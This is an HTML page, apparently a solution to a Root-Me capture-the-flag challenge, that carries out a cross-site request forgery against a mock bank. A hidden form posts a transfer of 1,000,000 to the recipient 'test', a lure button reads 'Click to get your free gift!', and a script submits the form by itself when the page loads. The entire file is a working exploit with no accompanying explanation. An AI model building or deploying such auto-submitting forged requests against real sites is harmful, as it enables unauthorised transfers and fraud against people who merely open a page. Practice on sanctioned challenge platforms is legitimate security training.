<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attaque CSRF - Soumission Automatique</title>
</head>
<body>
    <h1>Transfert de fonds CSRF</h1>

    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
        <input type="hidden" name="recipient" value="test"/>
        <input type="hidden" name="amount" value="1000000"/>
        <input type="submit" value="Click to get your free gift!"/>
    </form>

    <script>
        // Fonction de validation avant soumission
        function validateAndSubmit() {
            const recipient = document.querySelector('input[name="recipient"]').value;
            const amount = document.querySelector('input[name="amount"]').value;

            // Valider les données avant soumission
            if (recipient === "" || amount === "") {
                alert("Les informations nécessaires sont manquantes !");
                return; // Ne pas soumettre si les données sont invalides
            }

            // Si tout est valide, soumettre le formulaire
            document.getElementById('csrfForm').submit();
        }

        // Exécuter la validation et soumission dès le chargement de la page
        window.onload = validateAndSubmit;
    </script>
</body>
</html>
